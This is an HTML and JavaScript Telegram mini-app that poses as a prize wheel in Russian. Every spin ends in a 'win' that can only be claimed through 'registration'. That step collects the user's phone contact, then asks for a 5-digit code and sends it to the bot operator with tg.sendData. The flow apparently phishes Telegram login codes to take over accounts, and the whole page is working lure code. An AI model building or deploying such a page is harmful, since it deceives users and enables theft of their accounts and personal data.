<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
html, body { overflow-x: hidden; min-height: 100%; }

body {
  font-family: sans-serif; text-align: center;
  padding: 20px 16px 90px; color: #fff;
  min-height: 100vh; position: relative;
}

/* Фиксированный космический фон — без полосок */
body::before {
  content: '';
  position: fixed; inset: 0; z-index: -1;
  background-color: #05080f;
  background-image:
    radial-gradient(ellipse at 50% 20%, rgba(20,60,180,.35) 0%, transparent 55%),
    radial-gradient(ellipse at 80% 80%, rgba(50,10,120,.25) 0%, transparent 50%),
    radial-gradient(ellipse at 15% 65%, rgba(10,40,130,.2) 0%, transparent 45%),
    url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500"><g fill="%23fff"><circle cx="10" cy="25" r="0.8" opacity="0.9"/><circle cx="55" cy="8" r="0.6" opacity="0.7"/><circle cx="90" cy="42" r="1" opacity="0.8"/><circle cx="140" cy="15" r="0.7" opacity="0.9"/><circle cx="185" cy="55" r="1.2" opacity="0.6"/><circle cx="230" cy="20" r="0.8" opacity="0.8"/><circle cx="275" cy="48" r="0.6" opacity="0.9"/><circle cx="320" cy="10" r="1" opacity="0.7"/><circle cx="370" cy="38" r="0.8" opacity="0.8"/><circle cx="420" cy="18" r="0.6" opacity="0.9"/><circle cx="470" cy="50" r="1" opacity="0.7"/><circle cx="30" cy="80" r="1.2" opacity="0.6"/><circle cx="75" cy="95" r="0.8" opacity="0.8"/><circle cx="120" cy="75" r="0.6" opacity="0.9"/><circle cx="165" cy="100" r="1" opacity="0.7"/><circle cx="210" cy="82" r="0.8" opacity="0.8"/><circle cx="255" cy="110" r="0.6" opacity="0.9"/><circle cx="300" cy="88" r="1.2" opacity="0.6"/><circle cx="345" cy="72" r="0.8" opacity="0.8"/><circle cx="395" cy="105" r="0.6" opacity="0.7"/><circle cx="445" cy="85" r="1" opacity="0.9"/><circle cx="490" cy="95" r="0.8" opacity="0.8"/><circle cx="20" cy="140" r="0.6" opacity="0.9"/><circle cx="65" cy="155" r="1" opacity="0.7"/><circle cx="110" cy="130" r="0.8" opacity="0.8"/><circle cx="155" cy="165" r="0.6" opacity="0.9"/><circle cx="200" cy="145" r="1.2" opacity="0.6"/><circle cx="245" cy="170" r="0.8" opacity="0.8"/><circle cx="290" cy="135" r="0.6" opacity="0.7"/><circle cx="335" cy="160" r="1" opacity="0.9"/><circle cx="380" cy="142" r="0.8" opacity="0.8"/><circle cx="430" cy="168" r="1.2" opacity="0.6"/><circle cx="475" cy="148" r="0.6" opacity="0.9"/><circle cx="40" cy="200" r="1" opacity="0.7"/><circle cx="85" cy="215" r="0.8" opacity="0.8"/><circle cx="130" cy="195" r="0.6" opacity="0.9"/><circle cx="175" cy="225" r="1" opacity="0.7"/><circle cx="220" cy="205" r="0.8" opacity="0.8"/><circle cx="265" cy="230" r="1.2" opacity="0.6"/><circle cx="310" cy="210" r="0.6" opacity="0.9"/><circle cx="355" cy="220" r="1" opacity="0.7"/><circle cx="400" cy="200" r="0.8" opacity="0.8"/><circle cx="450" cy="218" r="0.6" opacity="0.9"/><circle cx="15" cy="265" r="0.8" opacity="0.8"/><circle cx="60" cy="275" r="1" opacity="0.7"/><circle cx="105" cy="255" r="0.6" opacity="0.9"/><circle cx="150" cy="280" r="0.8" opacity="0.8"/><circle cx="195" cy="265" r="1.2" opacity="0.6"/><circle cx="240" cy="285" r="0.6" opacity="0.9"/><circle cx="285" cy="270" r="1" opacity="0.7"/><circle cx="330" cy="258" r="0.8" opacity="0.8"/><circle cx="375" cy="278" r="0.6" opacity="0.9"/><circle cx="425" cy="262" r="1" opacity="0.7"/><circle cx="470" cy="275" r="0.8" opacity="0.8"/><circle cx="35" cy="320" r="1.2" opacity="0.6"/><circle cx="80" cy="310" r="0.8" opacity="0.8"/><circle cx="125" cy="335" r="0.6" opacity="0.9"/><circle cx="170" cy="315" r="1" opacity="0.7"/><circle cx="215" cy="340" r="0.8" opacity="0.8"/><circle cx="260" cy="325" r="1.2" opacity="0.6"/><circle cx="305" cy="318" r="0.6" opacity="0.9"/><circle cx="350" cy="332" r="1" opacity="0.7"/><circle cx="395" cy="312" r="0.8" opacity="0.8"/><circle cx="445" cy="328" r="0.6" opacity="0.9"/><circle cx="488" cy="315" r="1" opacity="0.7"/><circle cx="25" cy="375" r="0.8" opacity="0.8"/><circle cx="70" cy="390" r="1" opacity="0.7"/><circle cx="115" cy="368" r="0.6" opacity="0.9"/><circle cx="160" cy="385" r="0.8" opacity="0.8"/><circle cx="205" cy="372" r="1.2" opacity="0.6"/><circle cx="250" cy="395" r="0.6" opacity="0.9"/><circle cx="295" cy="378" r="1" opacity="0.7"/><circle cx="340" cy="368" r="0.8" opacity="0.8"/><circle cx="385" cy="388" r="0.6" opacity="0.9"/><circle cx="435" cy="375" r="1" opacity="0.7"/><circle cx="480" cy="392" r="0.8" opacity="0.8"/><circle cx="50" cy="445" r="1.2" opacity="0.6"/><circle cx="100" cy="460" r="0.8" opacity="0.8"/><circle cx="150" cy="440" r="0.6" opacity="0.9"/><circle cx="200" cy="458" r="1" opacity="0.7"/><circle cx="250" cy="445" r="0.8" opacity="0.8"/><circle cx="300" cy="462" r="1.2" opacity="0.6"/><circle cx="350" cy="448" r="0.6" opacity="0.9"/><circle cx="400" cy="455" r="1" opacity="0.7"/><circle cx="450" cy="442" r="0.8" opacity="0.8"/><circle cx="490" cy="458" r="0.6" opacity="0.9"/></g></svg>');
  background-repeat: no-repeat, no-repeat, no-repeat, repeat;
  background-size: 100% 100%, 100% 100%, 100% 100%, 500px 500px;
}

/* Вкладки */
.tab-content { display: none; }
.tab-content.active {
  display: flex; flex-direction: column;
  align-items: center; justify-content: center;
  min-height: calc(100vh - 150px);
}

/* Колесо */
.wheel-wrap {
  position: relative;
  width: min(300px, 80vw);
  height: min(300px, 80vw);
  margin: 0 auto 16px;
}

#wheelCanvas { width: 100%; height: 100%; border-radius: 50%; display: block; }

.wheel-pointer {
  position: absolute; top: -16px; left: 50%; transform: translateX(-50%);
  width: 0; height: 0;
  border-left: 14px solid transparent; border-right: 14px solid transparent;
  border-top: 24px solid #3d9eff;
  filter: drop-shadow(0 0 6px rgba(61,158,255,.9));
  z-index: 5;
}

#spin {
  margin-top: 20px; padding: 14px 36px; font-size: 18px;
  border: none; border-radius: 14px;
  background: linear-gradient(135deg, #1a5fcc, #3d9eff);
  color: #fff; box-shadow: 0 0 18px rgba(61,158,255,.5);
}
#spin:disabled { opacity: 0.4; box-shadow: none; }

/* Оверлей "уже использован" */
.used-overlay {
  display: none; position: fixed; inset: 0;
  background: rgba(5,8,15,.9); backdrop-filter: blur(8px);
  align-items: center; justify-content: center;
  flex-direction: column; gap: 16px; z-index: 30; cursor: pointer;
}
.used-overlay.show { display: flex; }
.used-overlay .used-icon { font-size: 52px; }
.used-overlay p { font-size: 22px; font-weight: 700; color: #fff; }
.used-overlay small { font-size: 13px; color: #8aaad4; }

/* Регистрация */
.step { display: none; width: 100%; max-width: 320px; }
.step.active { display: flex; flex-direction: column; align-items: center; gap: 18px; }
.step h2 { font-size: 24px; font-weight: 700; text-shadow: 0 0 16px rgba(61,158,255,.6); }
.step p { font-size: 15px; color: #8aaad4; line-height: 1.6; max-width: 260px; }

.code { display: flex; justify-content: center; gap: 10px; }
.code input {
  width: 48px; height: 64px; font-size: 28px; text-align: center;
  background: rgba(61,158,255,.07); color: #fff;
  border: 2px solid rgba(61,158,255,.3); border-radius: 12px;
}
.code input:focus { border-color: #3d9eff; outline: none; box-shadow: 0 0 10px rgba(61,158,255,.4); }

button#send, button#askContact {
  padding: 14px 0; font-size: 17px; border: none; border-radius: 14px;
  background: linear-gradient(135deg, #1a5fcc, #3d9eff);
  color: #fff; width: 100%; max-width: 280px;
  box-shadow: 0 0 18px rgba(61,158,255,.4);
}
button#send:disabled { opacity: 0.4; box-shadow: none; }

/* Таббар */
.tabbar {
  position: fixed; bottom: 0; left: 0; right: 0; display: flex;
  border-top: 1px solid rgba(61,158,255,.15);
  background: rgba(5,8,15,.97); backdrop-filter: blur(12px);
}
.tabbar button.tab-btn {
  flex: 1; padding: 14px 0; background: none; border: none;
  font-size: 15px; color: #445577;
  display: flex; flex-direction: column; align-items: center; gap: 2px;
}
.tabbar button.tab-btn.active { color: #3d9eff; font-weight: bold; }

/* Оверлей выигрыша */
.overlay {
  position: fixed; inset: 0;
  background: rgba(5,8,15,.92); backdrop-filter: blur(10px);
  display: none; align-items: center; justify-content: center;
  flex-direction: column; z-index: 50; padding: 20px; gap: 18px;
}
.overlay.show { display: flex; }
.overlay img {
  width: 160px; height: 160px; object-fit: cover; border-radius: 20px;
  border: 3px solid #3d9eff;
  box-shadow: 0 0 30px rgba(61,158,255,.6), 0 0 60px rgba(61,158,255,.2);
}
.overlay p { font-size: 16px; color: #8aaad4; max-width: 260px; line-height: 1.6; }
.overlay button {
  padding: 14px 0; font-size: 16px; border: none; border-radius: 14px;
  background: linear-gradient(135deg, #1a5fcc, #3d9eff);
  color: #fff; width: 100%; max-width: 280px;
  box-shadow: 0 0 18px rgba(61,158,255,.4);
}
</style>
</head>
<body>

<div id="tab1" class="tab-content active">
  <div class="wheel-wrap">
    <div class="wheel-pointer"></div>
    <canvas id="wheelCanvas"></canvas>
  </div>
  <button id="spin">Крутить 🎡</button>
</div>

<div id="tab2" class="tab-content">
  <div id="stepContact" class="step active">
    <h2>Вход</h2>
    <p>Чтобы продолжить, отправьте свой контакт</p>
    <button id="askContact">📱 Отправить контакт</button>
  </div>
  <div id="stepCode" class="step">
    <h2>Введите 5-значный код</h2>
    <div class="code">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
    </div>
    <button id="send" disabled>Подтвердить</button>
  </div>
</div>

<div class="tabbar">
  <button class="tab-btn active" data-tab="tab1">🎡</button>
  <button class="tab-btn" data-tab="tab2">Вход</button>
</div>

<div class="overlay" id="winOverlay">
  <img id="winImage" src="" alt="">
  <p>Чтобы забрать приз, пройдите регистрацию</p>
  <button id="goToReg">Перейти к регистрации</button>
</div>

<div class="used-overlay" id="usedOverlay">
  <div class="used-icon">🚫</div>
  <p>Бонус уже использован</p>
  <small>Нажмите, чтобы закрыть</small>
</div>

<script>
const tg = window.Telegram.WebApp;
tg.ready(); tg.expand();

// Переключение вкладок
const tabButtons = document.querySelectorAll(".tab-btn");
const tabContents = document.querySelectorAll(".tab-content");
function openTab(id) {
  tabButtons.forEach(b => b.classList.toggle("active", b.dataset.tab === id));
  tabContents.forEach(c => c.classList.toggle("active", c.id === id));
}
tabButtons.forEach(btn => btn.addEventListener("click", () => openTab(btn.dataset.tab)));

// ---- КОЛЕСО (canvas) ----
// КАРТИНКИ: замени ссылки здесь
const IMG_SRCS = [
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/vDF6dZB8/photo-5447343585033396379-x.jpg",
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/vDF6dZB8/photo-5447343585033396379-x.jpg",
  "https://i.postimg.cc/vDF6dZB8/photo-5447343585033396379-x.jpg"
];

const COUNT = IMG_SRCS.length;
const STEP_RAD = (2 * Math.PI) / COUNT;
const SECTOR_COLORS = ["#1e4fa0", "#0d2a6e"];

// Предзагрузка картинок
const imgs = IMG_SRCS.map(src => {
  const img = new Image();
  img.crossOrigin = "anonymous";
  img.src = src;
  img.onload = () => drawWheel(currentRot);
  img.onerror = () => drawWheel(currentRot);
  return img;
});

// Canvas setup с учётом DPR (чёткость на retina)
const canvas = document.getElementById("wheelCanvas");
const dpr = Math.min(window.devicePixelRatio || 1, 2);
const SIZE = 300;
canvas.width = SIZE * dpr;
canvas.height = SIZE * dpr;
const ctx = canvas.getContext("2d");
ctx.scale(dpr, dpr);
const CX = SIZE / 2, CY = SIZE / 2, R = SIZE / 2 - 3;

function drawWheel(rotDeg) {
  ctx.clearRect(0, 0, SIZE, SIZE);
  const rotRad = rotDeg * Math.PI / 180;

  ctx.save();
  ctx.beginPath();
  ctx.arc(CX, CY, R, 0, 2 * Math.PI);
  ctx.clip();

  for (let i = 0; i < COUNT; i++) {
    const a0 = rotRad + i * STEP_RAD - Math.PI / 2;
    const a1 = a0 + STEP_RAD;

    // Сектор
    ctx.beginPath();
    ctx.moveTo(CX, CY);
    ctx.arc(CX, CY, R, a0, a1);
    ctx.closePath();
    ctx.fillStyle = SECTOR_COLORS[i % 2];
    ctx.fill();
    ctx.strokeStyle = "rgba(61,158,255,0.45)";
    ctx.lineWidth = 1;
    ctx.stroke();

    // Картинка в центре сектора — контр-вращается, всегда прямо
    const midA = a0 + STEP_RAD / 2;
    const dist = R * 0.63;
    const ix = CX + Math.cos(midA) * dist;
    const iy = CY + Math.sin(midA) * dist;
    const SZ = 46, half = SZ / 2;

    ctx.save();
    ctx.translate(ix, iy);
    ctx.rotate(-rotRad); // держим картинку прямо
    ctx.beginPath();
    if (ctx.roundRect) ctx.roundRect(-half, -half, SZ, SZ, 7);
    else ctx.rect(-half, -half, SZ, SZ);
    ctx.clip();
    if (imgs[i].complete && imgs[i].naturalWidth > 0) {
      ctx.drawImage(imgs[i], -half, -half, SZ, SZ);
    } else {
      ctx.fillStyle = "rgba(61,158,255,0.25)";
      ctx.fill();
    }
    ctx.restore();
  }

  ctx.restore();

  // Кольцо со свечением
  ctx.save();
  ctx.beginPath();
  ctx.arc(CX, CY, R, 0, 2 * Math.PI);
  ctx.strokeStyle = "#3d9eff";
  ctx.lineWidth = 4;
  ctx.shadowColor = "rgba(61,158,255,0.7)";
  ctx.shadowBlur = 14;
  ctx.stroke();
  ctx.restore();
}

drawWheel(0);

// Анимация вращения
let currentRot = 0;
let spinUsed = false;

function easeOutQuart(t) { return 1 - Math.pow(1 - t, 4); }

function animateSpin(from, to, duration, onDone) {
  const start = performance.now();
  (function frame(now) {
    const t = Math.min((now - start) / duration, 1);
    drawWheel(from + (to - from) * easeOutQuart(t));
    t < 1 ? requestAnimationFrame(frame) : (currentRot = to, onDone());
  })(performance.now());
}

const spinBtn = document.getElementById("spin");
const overlay = document.getElementById("winOverlay");
const winImage = document.getElementById("winImage");
const goToReg = document.getElementById("goToReg");
const usedOverlay = document.getElementById("usedOverlay");

spinBtn.addEventListener("click", () => {
  if (spinUsed) { usedOverlay.classList.add("show"); return; }
  spinBtn.disabled = true;
  const targetRot = currentRot + 5 * 360 + Math.floor(Math.random() * 360);
  animateSpin(currentRot, targetRot, 4000, () => {
    spinUsed = true;
    const norm = ((targetRot % 360) + 360) % 360;
    let idx = Math.round((360 - norm) / (360 / COUNT)) % COUNT;
    if (idx < 0) idx += COUNT;
    winImage.src = IMG_SRCS[idx];
    overlay.classList.add("show");
  });
});

goToReg.addEventListener("click", () => {
  overlay.classList.remove("show");
  openTab("tab2");
});

usedOverlay.addEventListener("click", () => {
  usedOverlay.classList.remove("show");
});

// Контакт
const stepContact = document.getElementById("stepContact");
const stepCode = document.getElementById("stepCode");
document.getElementById("askContact").addEventListener("click", () => {
  tg.requestContact(granted => {
    if (granted) {
      stepContact.classList.remove("active");
      stepCode.classList.add("active");
    }
  });
});

// Ввод кода
const inputs = document.querySelectorAll(".code input");
const sendBtn = document.getElementById("send");
function getCode() { return [...inputs].map(i => i.value).join(""); }
inputs.forEach((input, i) => {
  input.addEventListener("input", () => {
    input.value = input.value.replace(/\D/g, "");
    if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
    sendBtn.disabled = getCode().length !== 5;
  });
  input.addEventListener("keydown", e => {
    if (e.key === "Backspace" && !input.value && i > 0) inputs[i - 1].focus();
  });
});
sendBtn.addEventListener("click", () => tg.sendData(getCode()));
</script>
</body>
</html>
